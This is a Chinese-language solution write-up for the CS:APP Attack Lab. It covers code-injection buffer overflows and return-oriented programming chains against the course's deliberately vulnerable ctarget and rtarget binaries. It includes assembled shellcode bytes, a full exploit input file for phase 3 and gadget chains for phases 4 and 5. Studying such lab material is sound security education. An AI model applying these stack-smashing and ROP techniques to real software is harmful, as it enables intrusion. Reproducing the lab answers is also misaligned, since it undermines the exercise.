# CS:APP Attack Lab

https://csapp.cs.cmu.edu/3e/labs.html

请注意具体数值依赖于 `ctarget` 和 `rtarget` 的内容。

## 1

首先用 40 字节填满 `buf`，然后再用 `touch1` 的地址覆盖原返回地址即可。

需要注意的是，这 40 字节虽然是任意的，但不能包含 `0a`。

## 2

还是用 40 字节填满 `buf`，然后再将返回地址设置为返回地址的地址的后面，然后在返回地址的后面插入需要执行的代码。

返回地址的地址，或者说 `%rsp` 的值，可以通过 `gdb` 得到。

需要执行的代码的汇编代码为：

```
	movq $0x4a8bf816, %rdi
	pushq $0x401ccd
	ret
```

汇编得到字节码：

```
48 c7 c7 16 f8 8b 4a
68 cd 1c 40 00
c3
```

## 3

和 2 类似，只是要在代码的后面插入 cookie 字符串 `34 61 38 62 66 38 31 36 00`，然后将 `touch3` 的参数设置为这个字符串的地址。

但是，据我观察，`hexmatch` 函数中的 `random` 每次运行得到的结果是一样的，所以 `hexmatch` 中 `s` 的地址是固定的，可以传入 `s` 的地址来作弊地通过测试，`3.txt` 为：

```
/* 40 bytes */
00 01 02 03 04 05 06 07
08 09 00 0b 0c 0d 0e 0f
10 11 12 13 14 15 16 17
18 19 1a 1b 1c 1d 1e 1f
20 21 22 23 24 25 26 27

/* address of the injected instructions */
58 a9 64 55 00 00 00 00

48 c7 c7 cf a8 64 55 /* movq <address of s>, %rdi */
68 f2 1d 40 00       /* pushq <address of touch3> */
c3                   /* ret */
```

## 4

需要修改 `%rdi`，所以需要 `movq %rxx, %rdi` 或 `popq %rdi`。

在 farm 中没有找到 `popq %rdi` 的字节码 `5f`，但能找到 `48 89 c7` (位于 `addval_130` 或 `getval_303`) 即 `movq %rax, %rdi`，所以还需要 `popq %rax`，即 `58` (位于 `setval_419` 或 `addval_454`)。

所以目标是执行效果类似下面汇编的指令：

```
test:
	ret # gadget1

gadget1:
	popq %rax
	ret # gadget2

gadget2:
	movq %rax, %rdi
	ret # touch2
```

这需要栈中从顶开始依次是 `gadget1` 地址、`touch2` 参数、`gadget2` 地址、`touch2` 地址。

## 5

因为栈的地址是动态的，需要获取 `%rsp` 的值来得到 cookie 字符串的地址。

在 farm 中搜索 `movq %rsp, %rxx` 即 `48 89 e`，发现 `getval_195` 和 `getval_153` 中有 `48 89 e0 c3` 即 `movq %rsp, %rax` 然后 `ret`。

因为获取到 `%rsp` 时马上就要 `ret`，`%rsp` 指向的会是一个返回地址而不能是 cookie 字符串，所以要对这个值进行运算才能得到 cookie 字符串的地址，可以使用 farm 中的 `add_xy` 函数 (`%rdi + %rsi -> %rax`)。

farm 中还有 `movq %rax, %rdi` (`48 89 c7`), `movl %eax, %ecx` (`89 c1`), `movl %ecx, %edx` (`89 ca`)、`movl %edx, %esi` (`89 d6`)。

最后需要执行的指令是：

```
test:
    ret # g1

g1:
    movq %rsp, %rax
    ret # g2

g2:
    movq %rax, %rdi
    ret # g3

g3:
    popq %rax # 72
    ret # g4

g4:
    movl %eax, %ecx
    ret # g5

g5:
    movl %ecx, %edx
    ret # g6

g6:
    movl %edx, %esi
    ret # g7

g7:
    leaq (%rdi, %rsi), %rax
    ret # g8

g8:
    movq %rax, %rdi
    ret # touch3
```

栈中从顶开始依次为 `g1`、`g2`、`g3`、`$72`、`g4`、`g5`、`g6`、`g7`、`g8`、`touch3`、cookie string。

P.S. 一开始我以为只能使用 Figure 3 中给出编码的那些指令，想了很久，后来才意识到表中给出编码是为了改变原指令的语义，如果使用原语义的话还有其他指令 (`lea`) 可以使用。
